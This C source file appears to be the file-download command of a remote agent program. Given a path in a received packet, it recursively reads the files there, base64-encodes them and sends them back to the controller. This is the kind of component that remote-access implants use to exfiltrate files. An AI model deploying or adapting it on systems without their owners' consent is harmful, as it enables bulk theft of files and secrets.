#include <stdint.h>
#include <stdio.h>
#include <memory.h>
#include <dirent.h>
#include "cJSON.h"
#include "agent_utility.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_commands.h"
#include "agent_config.h"

static cJSON* add_file(FILE* file, char* file_name) {
	uint8_t* content = ZERO(uint8_t);
	char* base64_content = ZERO(char);
	cJSON* jfile = ZERO(cJSON);

	// get size
	if (fseek(file, 0, SEEK_END)) goto fail;
	size_t size = ftell(file);
	if (fseek(file, 0, SEEK_SET)) goto fail;

	// read content
	content = MEM_ALLOC(size);
	if (!fread(content, sizeof(uint8_t), size, file)) goto fail;

	// encode the content
	base64_content = base64_encode(size, content);
	if (!base64_content) goto fail;

	// compose packet
	jfile = cJSON_CreateObject();
	if (!jfile) goto fail;

	cJSON* jname = cJSON_CreateString(file_name);
	if (!jname) goto fail;
	if (!cJSON_AddItemToObject(jfile, "name", jname)) goto fail;

	cJSON* jcontent = cJSON_CreateString(base64_content);
	if (!jcontent) goto fail;
	if (!cJSON_AddItemToObject(jfile, "content", jcontent)) goto fail;

	FREE(base64_content);
	FREE(content);
	return jfile;

fail:
	if (jfile) cJSON_Delete(jfile);
	FREE(base64_content);
	FREE(content);
	return ZERO(cJSON);
}

static void scan_dir(DIR* dir, char* input_path, cJSON* jpayload) {
	DIR* sub_dir = ZERO(DIR);
	struct dirent* dir_ent = { 0 };

	while (dir_ent = readdir(dir)) {
		if (!strcmp(dir_ent->d_name, ".") || !strcmp(dir_ent->d_name, "..")) continue;

		size_t size = snprintf(0, 0, "%s%c%s", input_path, DIRECTORY_SEPARATOR,  dir_ent->d_name) + 1;
		char* full_path = MEM_ALLOC(size);
		if (!full_path) return;
		snprintf(full_path, size, "%s%c%s", input_path, DIRECTORY_SEPARATOR, dir_ent->d_name);

		FILE* file = fopen(full_path, "rb");
		if (!file) {
			// it is a directory
			DIR* sub_dir = opendir(full_path);
			if (sub_dir) {
				scan_dir(sub_dir, full_path, jpayload);
				closedir(sub_dir);
			}			
		}
		else {
			cJSON* jfile = add_file(file, full_path);
			if (jfile) cJSON_AddItemToArray(jpayload, jfile);
			fclose(file);
		}		
		FREE(full_path);
	}
}

command_result* cmd_download_files(session* sess, packet* pck) {
	cJSON* jpayload = ZERO(cJSON);
	cJSON* jfile_list = ZERO(cJSON);
	cJSON* jroot_path = ZERO(cJSON);
	uint32_t result = ERROR_OK;
	char* input_path = ZERO(char);
	char expanded_input_path[4096] = { 0 };
	char* payload = ZERO(char);
	DIR* dir = ZERO(DIR);
	FILE* file = ZERO(FILE);
	DECLARE_RESULT_WITH_FEEDBACK(cmd_result);

	// create payload json object
	jpayload = cJSON_CreateObject();
	if (!jpayload) goto exit;

	// create object containing all downloaded files
	jfile_list = cJSON_CreateArray();
	if (!jfile_list) goto exit;
	if (!cJSON_AddItemToObject(jpayload, "files", jfile_list)) goto exit;

	// clone the input path	
	input_path = MEM_ALLOC(pck->data_size + 1);
	if (!input_path) {
		result = ERROR_UNKNOWN;
		goto exit;
	}
	memcpy(input_path, pck->data, pck->data_size);

	// expand the input path	
	if (!expand_environment_variables(input_path, expanded_input_path, sizeof expanded_input_path)) goto exit;

	// add root path
	jroot_path = cJSON_CreateString(expanded_input_path);
	if (!jroot_path) goto exit;
	if (!cJSON_AddItemToObject(jpayload, "path", jroot_path)) goto exit;

	// scan the path, first check if it is a file
	file = fopen(expanded_input_path, "rb");
	if (!file) {
		// maybe it is a directory
		dir = opendir(expanded_input_path);
		if (!dir) {
			result = ERROR_ALLOC_MEMORY;
			goto exit;
		}

		// compose packet by scanning recursively the directory
		scan_dir(dir, expanded_input_path, jfile_list);
	}
	else {
		// it is a single file
		cJSON* jfile = add_file(file, expanded_input_path);
		if (jfile) {
			// compose packet			
			if (!cJSON_AddItemToArray(jfile_list, jfile)) goto exit;
		}
	}

	// send response
	payload = cJSON_Print(jpayload);
	message_send_data(sess, pck, strlen(payload) + 1, (uint8_t*)payload);
	SET_RESULT_SUCCESS(cmd_result);

exit:
	FREE(input_path);
	FREE(payload);
	if (jpayload) cJSON_Delete(jpayload);
	if (file) fclose(file);
	if (dir) closedir(dir);
	return cmd_result;
}